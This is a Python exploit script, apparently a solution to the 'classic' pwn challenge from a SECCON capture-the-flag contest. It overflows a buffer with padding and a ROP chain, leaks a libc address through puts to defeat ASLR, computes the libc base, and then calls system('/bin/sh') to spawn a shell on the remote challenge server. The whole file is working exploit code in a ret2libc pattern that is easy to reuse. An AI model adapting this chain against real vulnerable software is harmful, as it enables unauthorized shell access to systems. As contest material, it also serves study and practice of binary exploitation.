#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './classic'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'classic.pwn.seccon.jp', 'port':17354})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    rop = ROP(binf)
    rop.puts(addr_got_main)
    rop.call(addr_main)

    exploit = 'a'*0x48
    exploit += str(rop)

    conn.sendlineafter('>> ', exploit)
    conn.recvuntil('pwn!!\n')

    addr_libc_main = u(conn.recvuntil('\n', drop=True))
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)

    exploit = 'a'*0x48
    exploit += str(rop)

    conn.sendlineafter('>> ', exploit)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
